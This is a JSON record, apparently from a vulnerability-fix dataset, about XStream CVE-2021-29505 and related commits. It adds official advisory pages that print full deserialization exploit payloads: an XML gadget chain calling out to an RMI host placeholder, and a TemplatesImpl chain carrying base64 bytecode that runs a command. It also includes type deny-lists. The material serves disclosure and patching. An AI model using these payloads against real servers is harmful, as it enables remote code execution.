{
  "cve_id": "CVE-2021-29505",
  "cve_desc": "XStream is software for serializing Java objects to XML and back again. A vulnerability in XStream versions prior to 1.4.17 may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types is affected. The vulnerability is patched in version 1.4.17.",
  "repo": "x-stream/xstream",
  "patch_hash": "24fac82191292c6ae25f94508d28b9823f83624f",
  "patch_info": {
    "commit_hash": "24fac82191292c6ae25f94508d28b9823f83624f",
    "repo": "x-stream/xstream",
    "commit_url": "https://github.com/x-stream/xstream/commit/24fac82191292c6ae25f94508d28b9823f83624f",
    "files": [
      "xstream-distribution/src/content/CVE-2021-29505.html",
      "xstream-distribution/src/content/changes.html",
      "xstream-distribution/src/content/security.html",
      "xstream-distribution/src/content/website.xml"
    ],
    "message": "Add description of CVE-2021-29505 and bug fix.",
    "before_after_code_files": [
      "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html",
      "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
      "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
    ]
  },
  "patch_diff": {
    "xstream-distribution/src/content/CVE-2021-29505.html||xstream-distribution/src/content/CVE-2021-29505.html": [
      "File: xstream-distribution/src/content/CVE-2021-29505.html -> xstream-distribution/src/content/CVE-2021-29505.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: <html>",
      "2: <!--",
      "3:  Copyright (C) 2021 XStream committers.",
      "4:  All rights reserved.",
      "6:  The software in this package is published under the terms of the BSD",
      "7:  style license a copy of which has been included with this distribution in",
      "8:  the LICENSE.txt file.",
      "10:  Created on 8. May 2021 by Joerg Schaible",
      "11:  -->",
      "12:   <head>",
      "13:     <title>CVE-2021-29505</title>",
      "14:   </head>",
      "15:   <body>",
      "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
      "19:     <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>",
      "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
      "23:  <p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is",
      "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
      "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
      "27:     <h2 id=\"description\">Description</h2>",
      "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
      "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
      "31:     input stream and replace or inject objects, that result in execution of a local command on the server.</p>",
      "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
      "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
      "36:  unmarshal it again with XStream:</p>",
      "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
      "38:   &lt;unserializable-parents/&gt;",
      "39:   &lt;java.util.PriorityQueue&gt;",
      "40:     &lt;default&gt;",
      "41:       &lt;size&gt;2&lt;/size&gt;",
      "42:     &lt;/default&gt;",
      "43:     &lt;int&gt;3&lt;/int&gt;",
      "44:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "45:       &lt;type&gt;12345&lt;/type&gt;",
      "46:       &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
      "47:         &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;",
      "48:       &lt;/value&gt;",
      "49:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "50:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "51:       &lt;type&gt;12345&lt;/type&gt;",
      "52:       &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
      "53:         &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
      "54:           &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
      "55:           &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
      "56:           &lt;bodyParts/&gt;",
      "57:           &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
      "58:             &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
      "59:             &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
      "60:               &lt;soapPart/&gt;",
      "61:               &lt;mm&gt;",
      "62:                 &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
      "63:                   &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;",
      "64:                     &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;",
      "65:                       &lt;names&gt;",
      "66:                         &lt;string&gt;aa&lt;/string&gt;",
      "67:                         &lt;string&gt;aa&lt;/string&gt;",
      "68:                       &lt;/names&gt;",
      "69:                       &lt;ctx&gt;",
      "70:                         &lt;environment/&gt;",
      "71:                         &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;",
      "72:                           &lt;java.rmi.server.RemoteObject&gt;",
      "73:                             &lt;string&gt;UnicastRef&lt;/string&gt;",
      "74:                             &lt;string&gt;ip2&lt;/string&gt;",
      "75:                             &lt;int&gt;1099&lt;/int&gt;",
      "76:                             &lt;long&gt;0&lt;/long&gt;",
      "77:                             &lt;int&gt;0&lt;/int&gt;",
      "78:                             &lt;short&gt;0&lt;/short&gt;",
      "79:                             &lt;boolean&gt;false&lt;/boolean&gt;",
      "80:                           &lt;/java.rmi.server.RemoteObject&gt;",
      "81:                         &lt;/registry&gt;",
      "82:                         &lt;host&gt;ip2&lt;/host&gt;",
      "83:                         &lt;port&gt;1099&lt;/port&gt;",
      "84:                       &lt;/ctx&gt;",
      "85:                     &lt;/candidates&gt;",
      "86:                   &lt;/aliases&gt;",
      "87:                 &lt;/it&gt;",
      "88:               &lt;/mm&gt;",
      "89:             &lt;/multiPart&gt;",
      "90:           &lt;/sm&gt;",
      "91:         &lt;/message&gt;",
      "92:       &lt;/value&gt;",
      "93:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
      "94:   &lt;/java.util.PriorityQueue&gt;",
      "95: &lt;/java.util.PriorityQueue&gt;",
      "96: </pre></div>",
      "97: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
      "98: xstream.fromXML(xml);",
      "99: </pre></div>",
      "101:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>",
      "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
      "105:     <h2 id=\"impact\">Impact</h2>",
      "107:  <p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by",
      "108:  manipulating the processed input stream.</p>",
      "110:     <h2 id=\"workarounds\">Workarounds</h2>",
      "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
      "114:     <h2 id=\"credits\">Credits</h2>",
      "116:     <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
      "118:    </body>",
      "119:  </html>",
      "",
      "---------------"
    ],
    "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
      "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "101:   <li>No support for Hibernate 3 collections.</li>",
      "102:  </ul>",
      "105:  <h1 id=\"upcoming-1.4.x\">Upcoming 1.4.x maintenance release</h1>",
      "107:  <p>Not yet released.</p>",
      "110:  <h1 id=\"1.4.16\">1.4.16</h1>",
      "",
      "[Removed Lines]",
      "104: <!--",
      "108: -->",
      "",
      "[Added Lines]",
      "108:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
      "109:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
      "110:  security framework.</p>",
      "112:  <h2>Stream compatibility</h2>",
      "114:  <ul>",
      "115:   <li>The following types are now blacklisted by default and the deserialization",
      "116:   of XML containing one of the two types will fail.  You will have to enable these types by explicit",
      "117:   configuration, if you need them:<br>",
      "118:    <ul>",
      "119:     <li>any type in the java.rmi.* and sun.rmi.* package hierarchies</li>",
      "120:     <li>the individual type com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl</li>",
      "121:    </ul>",
      "122:   </li>",
      "123:  </ul>",
      "",
      "---------------"
    ],
    "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html": [
      "File: xstream-distribution/src/content/security.html -> xstream-distribution/src/content/security.html",
      "--- Hunk 1 ---",
      "[Context before]",
      "44:     Exposure (CVE) system managed by the <a href=\"http://www.mitre.org/\">Mitre Corporation</a>. Following a list of the",
      "45:     reported vulnerabilities for the different versions:</p>",
      "48:       <tr>",
      "49:         <th>CVE</th>",
      "50:         <th>Description</th>",
      "51:       </tr>",
      "52:       <tr>",
      "53:         <th>Version 1.4.15</th>",
      "54:         <td></td>",
      "",
      "[Removed Lines]",
      "47:     <table summary=\"Table of reported vulnerabilities daocumented as CVE\">",
      "",
      "[Added Lines]",
      "47:     <table summary=\"Table of reported vulnerabilities documented as CVE\">",
      "52:       <tr>",
      "53:         <th>Version 1.4.16</th>",
      "54:         <td></td>",
      "55:         <td></td>",
      "56:       </tr>",
      "57:       <tr>",
      "58:         <th><a href=\"CVE-2021-29505.html\">CVE-2021-29505</a></th>",
      "59:         <td>XStream is vulnerable to a Remote Command Execution attack.</td>",
      "60:       </tr>",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "393: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
      "395: </pre></div>",
      "397:     add these lines to XStream's setup code:</p>",
      "398: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"sun.awt.datatransfer.DataTransferer$IndexOrderComparator\", \"sun.swing.SwingLazyValue\", \"com.sun.corba.se.impl.activation.ServerTableEntry\", \"com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator\" });",
      "399: xstream.denyTypesByRegExp(new String[]{ \".*\\\\$ServiceNameIterator\", \"javafx\\\\.collections\\\\.ObservableList\\\\$.*\", \".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader\" });",
      "400: xstream.denyTypeHierarchy(java.io.InputStream.class );",
      "",
      "[Removed Lines]",
      "396:     <p>Users of XStream 1.4.14 who insist to use XStream default blacklist - despite that clear recommendation - can",
      "",
      "[Added Lines]",
      "405:     <p>Users of XStream 1.4.16 who insist to use XStream default blacklist - despite that clear recommendation - can",
      "407: <div class=\"Source Java\"><pre>xstream.denyTypesByRegExp(new String[]{ \".*\\\\.Lazy(?:Search)?Enumeration.*\", \"(?:java|sun)\\\\.rmi\\\\..*\" });",
      "408: </pre></div>",
      "409:     <p>Users of XStream 1.4.15 should <strong>additionally</strong> add these lines to the lines from above:</p>",
      "",
      "---------------",
      "--- Hunk 3 ---",
      "[Context before]",
      "402: xstream.denyTypeHierarchy(javax.activation.DataSource.class );",
      "403: xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );",
      "404: </pre></div>",
      "406: <div class=\"Source Java\"><pre>xstream.denyTypes(new String[]{ \"javax.imageio.ImageIO$ContainsFilter\" });",
      "407: xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });",
      "408: </pre></div>",
      "",
      "[Removed Lines]",
      "405:     <p>Users of XStream 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
      "",
      "[Added Lines]",
      "417:     <p>Users of XStream 1.4.14 and 1.4.13 should <strong>additionally</strong> add these two lines to the lines from above:</p>",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "1fa7065a62e8e945814ef6d2b6c54e56e855159c",
      "candidate_info": {
        "commit_hash": "1fa7065a62e8e945814ef6d2b6c54e56e855159c",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/1fa7065a62e8e945814ef6d2b6c54e56e855159c",
        "files": [
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/index.html",
          "xstream-distribution/src/content/news.html"
        ],
        "message": "Fix new links to CVE-2021-29505.",
        "before_after_code_files": [
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/index.html||xstream-distribution/src/content/index.html",
          "xstream-distribution/src/content/news.html||xstream-distribution/src/content/news.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html": [
          "File: xstream-distribution/src/content/changes.html -> xstream-distribution/src/content/changes.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "112:  <p>Released May 13, 2021.</p>",
          "114:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "116:  security framework.</p>",
          "118:  <h2>Stream compatibility</h2>",
          "",
          "[Removed Lines]",
          "115:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "[Added Lines]",
          "115:  <a href=\"CVE-2021-29505.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/index.html||xstream-distribution/src/content/index.html": [
          "File: xstream-distribution/src/content/index.html -> xstream-distribution/src/content/index.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "76:     <h2 id=\"release\"><b>May 13, 2021</b> XStream 1.4.17 released</h2>",
          "80:  security framework.</p>",
          "82:  <p>View the complete <a href=\"changes.html\">change log</a> and <a href=\"download.html\">download</a>.</p>",
          "",
          "[Removed Lines]",
          "78:  <p class=\"highlight\">TThis maintenance release addresses the security vulnerability",
          "79:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "[Added Lines]",
          "78:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "79:  <a href=\"CVE-2021-29505.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/news.html||xstream-distribution/src/content/news.html": [
          "File: xstream-distribution/src/content/news.html -> xstream-distribution/src/content/news.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "19:     <h2 id=\"1.4.17\"><b>May 13, 2021</b> XStream 1.4.17 released</h2>",
          "21:  <p class=\"highlight\">This maintenance release addresses the security vulnerability",
          "23:  security framework.</p>",
          "25:  <p>View the complete <a href=\"changes.html\">change log</a> and <a href=\"download.html\">download</a>.</p>",
          "",
          "[Removed Lines]",
          "22:  <a href=\"CVE-2020-26258.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "[Added Lines]",
          "22:  <a href=\"CVE-2021-29505.html\">CVE-2021-29505</a>, when unmarshalling with XStream instances using an uninitialized",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "7faeeeb5a8c4924f68da81d7cc0ade02829a684e",
      "candidate_info": {
        "commit_hash": "7faeeeb5a8c4924f68da81d7cc0ade02829a684e",
        "repo": "x-stream/xstream",
        "commit_url": "https://github.com/x-stream/xstream/commit/7faeeeb5a8c4924f68da81d7cc0ade02829a684e",
        "files": [
          "xstream-distribution/src/content/CVE-2021-39139.html",
          "xstream-distribution/src/content/CVE-2021-39140.html",
          "xstream-distribution/src/content/CVE-2021-39141.html",
          "xstream-distribution/src/content/CVE-2021-39144.html",
          "xstream-distribution/src/content/CVE-2021-39145.html",
          "xstream-distribution/src/content/CVE-2021-39146.html",
          "xstream-distribution/src/content/CVE-2021-39147.html",
          "xstream-distribution/src/content/CVE-2021-39148.html",
          "xstream-distribution/src/content/CVE-2021-39149.html",
          "xstream-distribution/src/content/CVE-2021-39150.html",
          "xstream-distribution/src/content/CVE-2021-39151.html",
          "xstream-distribution/src/content/CVE-2021-39152.html",
          "xstream-distribution/src/content/CVE-2021-39153.html",
          "xstream-distribution/src/content/CVE-2021-39154.html",
          "xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html",
          "xstream-distribution/src/content/website.xml"
        ],
        "message": "Add new CVEs.",
        "before_after_code_files": [
          "xstream-distribution/src/content/CVE-2021-39139.html||xstream-distribution/src/content/CVE-2021-39139.html",
          "xstream-distribution/src/content/CVE-2021-39140.html||xstream-distribution/src/content/CVE-2021-39140.html",
          "xstream-distribution/src/content/CVE-2021-39141.html||xstream-distribution/src/content/CVE-2021-39141.html",
          "xstream-distribution/src/content/CVE-2021-39144.html||xstream-distribution/src/content/CVE-2021-39144.html",
          "xstream-distribution/src/content/CVE-2021-39145.html||xstream-distribution/src/content/CVE-2021-39145.html",
          "xstream-distribution/src/content/CVE-2021-39146.html||xstream-distribution/src/content/CVE-2021-39146.html",
          "xstream-distribution/src/content/CVE-2021-39147.html||xstream-distribution/src/content/CVE-2021-39147.html",
          "xstream-distribution/src/content/CVE-2021-39148.html||xstream-distribution/src/content/CVE-2021-39148.html",
          "xstream-distribution/src/content/CVE-2021-39149.html||xstream-distribution/src/content/CVE-2021-39149.html",
          "xstream-distribution/src/content/CVE-2021-39150.html||xstream-distribution/src/content/CVE-2021-39150.html",
          "xstream-distribution/src/content/CVE-2021-39151.html||xstream-distribution/src/content/CVE-2021-39151.html",
          "xstream-distribution/src/content/CVE-2021-39152.html||xstream-distribution/src/content/CVE-2021-39152.html",
          "xstream-distribution/src/content/CVE-2021-39153.html||xstream-distribution/src/content/CVE-2021-39153.html",
          "xstream-distribution/src/content/CVE-2021-39154.html||xstream-distribution/src/content/CVE-2021-39154.html",
          "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
          "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ],
          "candidate": [
            "xstream-distribution/src/content/changes.html||xstream-distribution/src/content/changes.html",
            "xstream-distribution/src/content/security.html||xstream-distribution/src/content/security.html"
          ]
        }
      },
      "candidate_diff": {
        "xstream-distribution/src/content/CVE-2021-39139.html||xstream-distribution/src/content/CVE-2021-39139.html": [
          "File: xstream-distribution/src/content/CVE-2021-39139.html -> xstream-distribution/src/content/CVE-2021-39139.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 26. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39139</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39139: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box with JDK",
          "24:     1.7u21 or below.  However, this scenario can be adjusted easily to an external Xalan that works regardless of the",
          "25:     version of the Java runtime.  No user is affected, who followed the recommendation to setup",
          "26:     <a href=\"security.html#framework\">XStream's security framework</a> with a whitelist limited to the minimal required",
          "27:     types.</p>",
          "29:     <h2 id=\"description\">Description</h2>",
          "31:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "32:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "33:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "35:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "37:     <p>Create a simple LinkedHashSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "38:     unmarshal it again with XStream:</p>",
          "39: <div class=\"Source XML\"><pre>&lt;linked-hash-set&gt;",
          "40:   &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization='custom'&gt;",
          "41:     &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "42:       &lt;default&gt;",
          "43:         &lt;__name&gt;Pwnr&lt;/__name&gt;",
          "44:         &lt;__bytecodes&gt;",
          "45:           &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE2NTkyOTE1MTgwNjAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNjU5MjkxNTE4MDYwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;",
          "46:           &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;",
          "47:         &lt;/__bytecodes&gt;",
          "48:         &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;",
          "49:         &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;",
          "50:       &lt;/default&gt;",
          "51:     &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "52:   &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;",
          "53:   &lt;dynamic-proxy&gt;",
          "54:     &lt;interface&gt;javax.xml.transform.Templates&lt;/interface&gt;",
          "55:     &lt;handler class='sun.reflect.annotation.AnnotationInvocationHandler' serialization='custom'&gt;",
          "56:       &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;",
          "57:         &lt;default&gt;",
          "58:           &lt;memberValues&gt;",
          "59:             &lt;entry&gt;",
          "60:               &lt;string&gt;f5a5a608&lt;/string&gt;",
          "61:               &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference='../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl'/&gt;",
          "62:             &lt;/entry&gt;",
          "63:           &lt;/memberValues&gt;",
          "64:           &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;",
          "65:         &lt;/default&gt;",
          "66:       &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;",
          "67:     &lt;/handler&gt;",
          "68:   &lt;/dynamic-proxy&gt;",
          "69: &lt;/linked-hash-set&gt;",
          "70: </pre></div>",
          "71: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "72: xstream.fromXML(xml);",
          "73: </pre></div>",
          "75:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "77:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "79:     <h2 id=\"impact\">Impact</h2>",
          "81:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "82:     input stream.</p>",
          "84:     <h2 id=\"workarounds\">Workarounds</h2>",
          "86:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "88:     <h2 id=\"credits\">Credits</h2>",
          "90:     <p>Lai Han of nsfocus security team found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "92:       </body>",
          "93:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39140.html||xstream-distribution/src/content/CVE-2021-39140.html": [
          "File: xstream-distribution/src/content/CVE-2021-39140.html -> xstream-distribution/src/content/CVE-2021-39140.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 27. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39140</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
